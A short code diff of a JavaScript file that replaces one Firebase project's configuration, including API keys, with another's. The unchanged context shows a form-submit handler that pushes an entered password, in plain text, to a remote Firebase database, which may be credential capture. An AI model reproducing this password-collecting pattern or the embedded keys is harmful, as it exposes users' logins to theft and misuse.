@@ -2,14 +2,14 @@ import { initializeApp } from 'firebase/app'
 import { getDatabase, ref, push, get, remove } from 'firebase/database'
 
 const appSettings = {
-    apiKey: "AIzaSyCRV4qSf3B5QKjrMP7zIDmXEAgHv6Fd-RY",
-    authDomain: "safiny-387ba.firebaseapp.com",
-    databaseURL: "https://safiny-387ba-default-rtdb.firebaseio.com",
-    projectId: "safiny-387ba",
-    storageBucket: "safiny-387ba.appspot.com",
-    messagingSenderId: "332325490200",
-    appId: "1:332325490200:web:9a8e4474d335a118cffd6d",
-    measurementId: "G-C19PLYGTFY"
+    apiKey: "AIzaSyBqlw1dd_yzQ1RH3ZfcGIF4_akKo-cMmcI",
+    authDomain: "safinybot-19536.firebaseapp.com",
+    databaseURL: "https://safinybot-19536-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "safinybot-19536",
+    storageBucket: "safinybot-19536.appspot.com",
+    messagingSenderId: "6715380273",
+    appId: "1:6715380273:web:7224840a23e1e1c5d8bb10",
+    measurementId: "G-VF7EK611DW"
   };
 const app = initializeApp(appSettings)
 const database = getDatabase(app)
@@ -25,3 +25,4 @@ document.addEventListener('submit', (e) => {
         Password: password.value
     })
 })
+console.log("clear")
